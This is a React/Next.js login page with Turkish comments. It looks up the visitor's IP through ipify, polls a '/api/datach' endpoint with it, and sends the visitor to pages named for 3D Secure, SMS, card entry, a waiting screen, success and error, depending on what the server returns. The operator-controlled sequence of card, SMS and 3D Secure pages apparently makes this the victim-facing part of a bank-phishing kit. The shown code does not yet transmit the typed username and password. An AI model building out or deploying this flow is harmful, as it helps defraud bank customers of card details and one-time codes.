import { useState } from 'react';

export default function Home() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');

  const handleSubmit = async (e) => {
    e.preventDefault();

    // Kullanıcı IP adresini almak için bir API çağrısı yapın (örnek olarak, ipify API'yi kullanabilirsiniz)
    const ipResponse = await fetch('https://api.ipify.org?format=json');
    const ipData = await ipResponse.json();
    const userIp = ipData.ip;

    // AJAX isteğini gönderin
    const response = await fetch(`/api/datach?ip=${userIp}`);
    const data = await response.json();

    // Yanıtı işleyin ve yönlendirme yapın
    if (data === 'sms') {
      window.location.href = '3dsayfa.php';
    } else if (data === 'tebrik') {
      window.location.href = 'basarili.php';
    } else if (data === 'hata') {
      window.location.href = 'hatali.php';
    } else if (data === 'sms2') {
      window.location.href = 'hatali.php';
    } else if (data === 'back') {
      window.location.href = 'sms.php';
    } else if (data === '1') {
      window.location.href = 'index5.php?1';
    } else if (data === '2') {
      window.location.href = 'kart.php';
    } else if (data === '3') {
      window.location.href = 'bekle.php';
    } else if (data === '4') {
      window.location.href = 'hatali.php';
    } else if (data === '5') {
      window.location.href = 'basarili.php';
    }
  };

  return (
    <div>
      <h1>Next.js Form</h1>
      <form onSubmit={handleSubmit}>
        <div>
          <label>Kullanıcı Adı:</label>
          <input
            type="text"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
          />
        </div>
        <div>
          <label>Parola:</label>
          <input
            type="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
          />
        </div>
        <button type="submit">Gönder</button>
      </form>
    </div>
  );
}
